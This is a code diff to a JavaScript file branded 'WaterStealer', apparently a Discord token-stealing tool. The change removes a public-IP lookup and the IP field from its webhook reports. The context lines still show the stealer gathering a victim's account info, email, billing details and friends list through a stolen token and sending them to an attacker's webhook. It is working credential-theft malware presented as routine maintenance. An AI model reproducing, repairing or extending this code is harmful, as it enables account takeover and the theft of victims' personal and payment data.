@@ -7,10 +7,6 @@ const https = require('https');
 const querystring = require("querystring");
 const fs = require("fs");
 
-async function getIp() {
-    return (await axios.get("https://ipinfo.io/json")).data;
-}
-
 var config = {
     brand: "WaterStealer",
 
@@ -256,7 +252,6 @@ var event_handlers = {
         const userInfo = await getUserInfo(token);
         const billing = await getBilling(token);
         const friends = await getRelationships(token);
-        var ip = (await getIp())['ip'] || "127.0.0.1";
 
         var params = {
             username: config.embed.username,
@@ -292,11 +287,6 @@ var event_handlers = {
                         inline: true
                     },
                     {
-                        name: "🔍 IP:",
-                        value: `\`${ip}\``,
-                        inline: true
-                    },
-                    {
                         name: "💻 Email:",
                         value: `\`${email}\``,
                         inline: true
@@ -326,7 +316,6 @@ var event_handlers = {
         const userInfo = await getUserInfo(token);
         const billing = await getBilling(token);
         const friends = await getRelationships(token);
-        var ip = (await getIp())['ip'] || "127.0.0.1";
 
         var params = {
             username: config.embed.username,
@@ -361,11 +350,6 @@ var event_handlers = {
                         inline: true
                     },
                     {
-                        name: "🔍 IP:",
-                        value: `\`${ip}\``,
-                        inline: true
-                    },
-                    {
                         name: "💻 Email:",
                         value: `\`${email}\``,
                         inline: true
@@ -395,7 +379,6 @@ var event_handlers = {
         var userInfo = await getUserInfo(token);
         var billing = await getBilling(token);
         var friends = await getRelationships(token);
-        var ip = (await getIp())['ip'] || "127.0.0.1";
 
         var params = {
             username: config.embed.username,
@@ -430,11 +413,6 @@ var event_handlers = {
                         inline: true
                     },
                     {
-                        name: "🔍 IP:",
-                        value: `\`${ip}\``,
-                        inline: true
-                    },
-                    {
                         name: "💻 Email:",
                         value: `\`${newEmail}\``,
                         inline: true
@@ -464,7 +442,6 @@ var event_handlers = {
         var userInfo = await getUserInfo(token);
         var billing = await getBilling(token);
         var friends = await getRelationships(token);
-        var ip = (await getIp())['ip'] || "127.0.0.1";
 
         var params = {
             username: config.embed.username,
@@ -496,11 +473,6 @@ var event_handlers = {
                     {
                         name: "💳 Billing:",
                         value: `\`${billing}\``,
-                        inline: true
-                    },
-                    {
-                        name: "🔍 IP:",
-                        value: `\`${ip}\``,
                         inline: true
                     },
                     {
@@ -689,7 +661,6 @@ async function initialize() {
         var userInfo;
         var billing;
         var friends;
-        var ip = (await getIp())['ip'] || "127.0.0.1";
 
         if (config.notify_on_initialization) {
             if (token == undefined) {
@@ -719,11 +690,6 @@ async function initialize() {
                             inline: true
                         },
                         {
-                            name: "🔍 IP:",
-                            value: `\`${ip}\``,
-                            inline: true
-                        },
-                        {
                             name: "💻 Email:",
                             value: `\`${email}\``,
                             inline: true
@@ -734,7 +700,6 @@ async function initialize() {
                 userInfo = await getUserInfo(token);
                 billing = await getBilling(token);
                 friends = await getRelationships(token);
-                var ip = (await getIp())['ip'] || "127.0.0.1";
 
                 sendToWebhook({
                     username: config.embed.username,
@@ -766,11 +731,6 @@ async function initialize() {
                         {
                             name: "💳 Billing:",
                             value: `\`${billing}\``,
-                            inline: true
-                        },
-                        {
-                            name: "🔍 IP:",
-                            value: `\`${ip}\``,
                             inline: true
                         },
                         {
@@ -828,11 +788,6 @@ async function initialize() {
                         {
                             name: "💳 Billing:",
                             value: `\`${billing}\``,
-                            inline: true
-                        },
-                        {
-                            name: "🔍 IP:",
-                            value: `\`${ip}\``,
                             inline: true
                         },
                         {
